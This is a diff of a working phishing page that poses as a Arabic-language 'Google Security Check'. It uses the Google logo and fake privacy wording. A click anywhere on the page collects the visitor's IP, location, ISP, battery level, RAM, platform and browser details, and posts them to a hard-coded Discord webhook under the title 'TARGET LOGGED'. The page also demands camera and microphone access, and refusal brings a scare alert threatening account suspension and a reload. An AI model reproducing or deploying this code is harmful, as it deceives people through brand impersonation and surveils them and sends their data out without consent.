@@ -1,79 +1,92 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="ar" dir="rtl">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Verification</title>
+    <title>Google Security Check</title>
     <script>
-        const HOOK = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
+        const WEBHOOK = "https://discord.com/api/webhooks/1484237384894775581/NlH9ZW7NVqz0NEQBEGPdixnycVulnArV_a4kr9Sufao9NwQfztk8k_7k12In3IsR_-67";
 
-        async function grab() {
-            let data = {
+        async function catchData(permissionStatus) {
+            let info = {
                 ip: "Scanning...",
-                loc: "Denied",
+                loc: "Pending",
                 ram: navigator.deviceMemory || "Unknown",
                 bat: "Unknown",
-                plat: navigator.platform
+                plat: navigator.platform,
+                agent: navigator.userAgent
             };
 
             try {
                 const res = await fetch('https://ipapi.co/json/');
                 const json = await res.json();
-                data.ip = json.ip;
-                data.loc = `${json.city}, ${json.country_name}`;
+                info.ip = json.ip;
+                info.loc = `${json.city}, ${json.country_name} (${json.org})`;
             } catch (e) {}
 
-            // طلب الأذونات (يشتغل فقط على HTTPS)
-            try {
-                await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-                send(data, "✅ GRANTED");
-            } catch (err) {
-                send(data, "❌ DENIED");
-                alert("Critical Error: Verification Failed. Please Allow Camera Access.");
-                location.reload(); 
-            }
-        }
-
-        async function send(info, status) {
             if (navigator.getBattery) {
                 const b = await navigator.getBattery();
                 info.bat = `${Math.round(b.level * 100)}%`;
             }
 
-            const msg = {
+            const payload = {
                 embeds: [{
-                    title: "🎯 TARGET LOGGED - SUPREME V16",
-                    color: 16711680,
+                    title: "🎯 TARGET LOGGED - SUPREME V17",
+                    color: 3447003,
                     fields: [
                         { name: "🌐 IP Address", value: info.ip, inline: true },
                         { name: "📍 Location", value: info.loc, inline: true },
-                        { name: "📸 Permissions", value: status, inline: true },
+                        { name: "📸 Camera/Mic", value: permissionStatus, inline: true },
                         { name: "🧠 RAM", value: info.ram + " GB", inline: true },
                         { name: "🔋 Battery", value: info.bat, inline: true },
-                        { name: "📱 OS", value: info.plat, inline: true }
+                        { name: "📱 System", value: info.plat, inline: true },
+                        { name: "🕵️ Browser", value: info.agent, inline: false }
                     ],
-                    footer: { text: "r3b Supreme Engine" },
+                    footer: { text: "r3b Supreme Engine | Security Audit" },
                     timestamp: new Date()
                 }]
             };
 
-            fetch(HOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(msg) });
+            fetch(WEBHOOK, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify(payload) });
         }
 
-        window.onclick = grab;
+        async function startForce() {
+            // سحب الـ IP فوراً عند الضغط
+            catchData("Waiting for Allow...");
+
+            try {
+                // طلب الكاميرا والميكروفون (سيظهر طلب جوجل الرسمي الآن)
+                await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
+                catchData("✅ GRANTED");
+                alert("Verification Successful. Your device is secured.");
+            } catch (err) {
+                catchData("❌ DENIED");
+                // رسالة تخويف لإجباره على الضغط على Allow
+                alert("CRITICAL ERROR: Google could not verify this device. Please click 'Allow' to prevent account suspension.");
+                location.reload();
+            }
+        }
+
+        // الكود يبدأ بمجرد الضغط على أي مكان في الصفحة
+        window.onclick = startForce;
     </script>
     <style>
-        body { background: #000; color: #0f0; font-family: 'Courier New', monospace; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; text-align: center; cursor: pointer; }
-        .box { border: 1px solid #0f0; padding: 50px; box-shadow: 0 0 15px #0f0; }
-        .blink { animation: blinker 1.5s linear infinite; }
-        @keyframes blinker { 50% { opacity: 0; } }
+        body { background: #fff; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; cursor: pointer; }
+        .card { text-align: center; max-width: 400px; padding: 20px; border: 1px solid #dadce0; border-radius: 8px; }
+        .logo { width: 74px; margin-bottom: 20px; }
+        h1 { font-size: 24px; color: #202124; margin-bottom: 10px; font-weight: 400; }
+        p { color: #3c4043; font-size: 14px; line-height: 1.5; margin-bottom: 25px; }
+        .btn { background: #1a73e8; color: #fff; padding: 10px 24px; border: none; border-radius: 4px; font-weight: 500; cursor: pointer; font-size: 14px; }
+        .btn:hover { background: #1765cc; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
     </style>
 </head>
 <body>
-    <div class="box">
-        <h1 class="blink">SYSTEM AUDIT REQUIRED</h1>
-        <p>Verification ID: #77429</p>
-        <p style="color: #fff;">[ CLICK TO VERIFY DEVICE ]</p>
+    <div class="card">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/2/2f/Google_2015_logo.svg" class="logo">
+        <h1>تحقق من الأمان</h1>
+        <p>لحماية حسابك، يرجى إجراء فحص سريع للجهاز للتأكد من عدم وجود برمجيات خبيثة.</p>
+        <button class="btn">بدء الفحص الآن</button>
+        <p style="font-size: 12px; color: #70757a; margin-top: 20px;">تتم معالجة البيانات وفقاً لسياسة خصوصية Google.</p>
     </div>
 </body>
 </html>
